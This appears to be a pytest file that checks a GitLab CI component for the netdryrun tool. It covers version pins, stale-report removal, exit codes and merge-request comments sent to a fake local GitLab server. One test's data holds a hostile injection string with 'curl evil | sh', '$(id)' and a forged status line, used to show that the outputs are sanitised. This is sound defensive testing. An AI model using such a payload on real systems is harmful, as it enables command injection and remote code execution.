"""The GitLab CI/CD component (templates/netdryrun.yml) must stay equivalent to the GitHub Action:
same pins, stale reports removed, and job outputs that lab text cannot spoof or turn into shell."""
import json
import os
import re
import subprocess
import sys
from pathlib import Path

import yaml

import netdryrun

ROOT = Path(__file__).parents[1]
TEMPLATE = ROOT / "templates" / "netdryrun.yml"


def _component():
    spec, body = yaml.safe_load_all(TEMPLATE.read_text(encoding="utf-8"))
    return spec["spec"]["inputs"], body


def _script() -> str:
    _, body = _component()
    (job,) = body.values()
    (script,) = job["script"]
    return script


def test_component_pins_match_the_action_and_the_release():
    inputs, _ = _component()
    action = yaml.safe_load((ROOT / "action.yml").read_text(encoding="utf-8"))["inputs"]
    clab = action["containerlab-version"]["default"]
    assert inputs["containerlab-version"]["default"] == clab
    assert inputs["image"]["default"].endswith(f":{clab}")  # containerlab's image is tagged by its version
    assert inputs["netdryrun-package"]["default"] == f"netdryrun=={netdryrun.__version__}"
    for name in ("path", "json-report", "junit-report", "settle", "hold"):
        assert inputs[name]["default"] == action[name]["default"], name


def test_component_uses_every_input_and_only_declared_ones():
    inputs, _ = _component()
    text = TEMPLATE.read_text(encoding="utf-8").split("\n---\n", 1)[1]
    used = set(re.findall(r"\$\[\[\s*inputs\.([\w-]+)\s*\]\]", text))
    assert used == set(inputs)


def test_component_publishes_reports_even_when_checks_fail():
    _, body = _component()
    (job,) = body.values()
    art = job["artifacts"]
    assert art["when"] == "always"
    assert art["reports"]["junit"] == "$[[ inputs.junit-report ]]"
    assert art["reports"]["dotenv"] == "netdryrun.env"


def test_component_removes_stale_reports_before_the_run():
    script = _script()
    rm = script.index("for f in ")
    assert rm < script.index("netdryrun run")
    for f in ('"$NDR_JSON"', '"$NDR_JUNIT"', '"$NDR_MARKDOWN"', "netdryrun.env"):
        assert f in script[rm:script.index("\n", rm)]


def test_component_exits_with_netdryruns_exit_code():
    script = _script()
    assert "NDR_EXIT=$?" in script
    assert script.rstrip().endswith('exit "$NDR_EXIT"')
    assert "env -i" in script  # the lab gets a minimal environment, not CI_JOB_TOKEN


def _dotenv(tmp_path, rep: dict | None, exit_code: str) -> dict:
    code = _script().split("<<'EOF'\n", 1)[1].rsplit("\nEOF", 1)[0]
    (tmp_path / "r.json").write_text(json.dumps(rep) if rep is not None else "")
    env = {**os.environ, "NDR_JSON": str(tmp_path / "r.json"), "NDR_EXIT": exit_code}
    subprocess.run([sys.executable, "-c", code], env=env, cwd=tmp_path, check=True)
    lines = (tmp_path / "netdryrun.env").read_text().splitlines()
    return dict(line.split("=", 1) for line in lines)


def test_component_outputs_cannot_be_spoofed_or_inject_shell(tmp_path):
    passed = {"status": "passed", "summary": {"passed": 3, "failed": 0}, "inconclusive_reason": None}
    assert _dotenv(tmp_path, passed, "0") == {"NETDRYRUN_STATUS": "passed", "NETDRYRUN_PASSED": "3",
                                              "NETDRYRUN_FAILED": "0", "NETDRYRUN_INCONCLUSIVE_REASON": ""}
    # a report committed in the MR claims "passed", but the run itself exited 2 (config error)
    assert _dotenv(tmp_path, passed, "2")["NETDRYRUN_STATUS"] == "error"
    assert _dotenv(tmp_path, None, "1")["NETDRYRUN_STATUS"] == "error"
    hostile = {"status": "inconclusive", "summary": {"passed": 0, "failed": 1},
               "inconclusive_reason": "r1: x\"; curl evil | sh; echo \"$(id)`id`'\nNETDRYRUN_STATUS=passed"}
    out = _dotenv(tmp_path, hostile, "3")
    assert out["NETDRYRUN_STATUS"] == "inconclusive"
    assert len(out) == 4
    assert not set(out["NETDRYRUN_INCONCLUSIVE_REASON"]) & set("`$\\\"'\n")


# ------------------------------------------------------------------- 0.3.3 (f): verdict artifact, MR comment

import http.server  # noqa: E402
import threading  # noqa: E402

from netdryrun import agent_result  # noqa: E402


def test_component_writes_and_keeps_the_agent_result():
    inputs, body = _component()
    assert inputs["verdict-report"]["default"] == "netdryrun-verdict.json"
    assert inputs["mr-comment"]["default"] == "false"
    assert inputs["mr-comment-token-variable"]["default"] == "NETDRYRUN_GITLAB_TOKEN"
    script = _script()
    assert '--verdict "$NDR_VERDICT"' in script
    rm = script.index("for f in ")
    assert '"$NDR_VERDICT"' in script[rm:script.index("\n", rm)]   # a committed verdict file never counts
    (job,) = body.values()
    assert "$[[ inputs.verdict-report ]]" in job["artifacts"]["paths"]


def _note_script() -> str:
    return _script().split("<<'NOTE'\n", 1)[1].split("\nNOTE", 1)[0]


def test_the_note_is_written_however_the_script_ends():
    script = _script()
    trap = script.index("trap ndr_note EXIT")
    assert trap < script.index("exit 2") and trap < script.index("netdryrun run")   # before any early exit
    assert "from netdryrun.comment import main_gitlab" in _note_script()


class FakeGitLab(http.server.BaseHTTPRequestHandler):
    calls: list = []

    def _reply(self, code, data):
        raw = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):  # noqa: N802
        self._reply(200, {"id": 99} if self.path.endswith("/user") else [])

    def do_POST(self):  # noqa: N802
        FakeGitLab.calls.append((self.path, json.loads(self.rfile.read(int(self.headers["Content-Length"])))["body"]))
        self._reply(201, {"id": 1})

    def log_message(self, *a):
        pass


def _run_note(tmp_path, extra_env, python_args=()):
    FakeGitLab.calls = []
    srv = http.server.HTTPServer(("127.0.0.1", 0), FakeGitLab)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    env = {"PATH": os.environ.get("PATH", ""), "PYTHONPATH": str(ROOT / "src"), "NDR_MR_COMMENT": "true",
           "NDR_TOKEN_VAR": "NETDRYRUN_GITLAB_TOKEN", "NETDRYRUN_GITLAB_TOKEN": "glpat", "NDR_PATH": "examples/frr-bgp",
           "NDR_VERDICT": "netdryrun-verdict.json", "NDR_MARKDOWN": "netdryrun-summary.md",
           "CI_API_V4_URL": f"http://127.0.0.1:{srv.server_port}/api/v4", "CI_PROJECT_ID": "42",
           "CI_MERGE_REQUEST_IID": "12", "CI_COMMIT_SHA": "cd" * 20, **extra_env}
    p = subprocess.run([sys.executable, *python_args, "-c", _note_script()], env=env, cwd=tmp_path,
                       capture_output=True, text=True)
    srv.shutdown()
    return p, FakeGitLab.calls


def test_the_note_carries_the_marker_the_header_and_the_commit(tmp_path):
    (tmp_path / "netdryrun.env").write_text("NETDRYRUN_STATUS=failed\n")
    (tmp_path / "netdryrun-summary.md").write_text("summary\n")
    (tmp_path / "netdryrun-verdict.json").write_text(json.dumps(
        {"schema": agent_result.RESULT_SCHEMA, "status": "failed", "passed": 3, "failed": 1,
         "verdict": agent_result.DO_NOT_APPLY}))
    p, calls = _run_note(tmp_path, {})
    assert p.returncode == 0, p.stderr
    (path, text), = calls
    assert path == "/api/v4/projects/42/merge_requests/12/notes"
    lines = text.split("\n")
    assert lines[0] == "<!-- netdryrun-comment examples/frr-bgp -->"
    assert '"status": "failed"' in lines[1] and '"commit": "' + "cd" * 20 + '"' in lines[1]


def test_a_job_that_stopped_before_any_report_still_rewrites_the_note_as_error(tmp_path):
    p, calls = _run_note(tmp_path, {})   # no netdryrun.env, no verdict, no summary
    (_, text), = calls
    assert '"status": "error"' in text.split("\n")[1]


def test_no_note_without_a_merge_request_a_token_or_the_input(tmp_path):
    for env in ({"CI_MERGE_REQUEST_IID": ""}, {"NETDRYRUN_GITLAB_TOKEN": ""}, {"NDR_MR_COMMENT": "false"}):
        p, calls = _run_note(tmp_path, env)
        assert p.returncode == 0 and calls == [], env
    p, _ = _run_note(tmp_path, {"NETDRYRUN_GITLAB_TOKEN": ""})
    assert "NETDRYRUN_GITLAB_TOKEN" in p.stdout


def test_without_netdryrun_installed_the_note_only_warns(tmp_path):
    p, calls = _run_note(tmp_path, {"PYTHONPATH": ""}, python_args=("-S",))
    assert p.returncode == 0 and calls == [] and "WARNING" in p.stdout
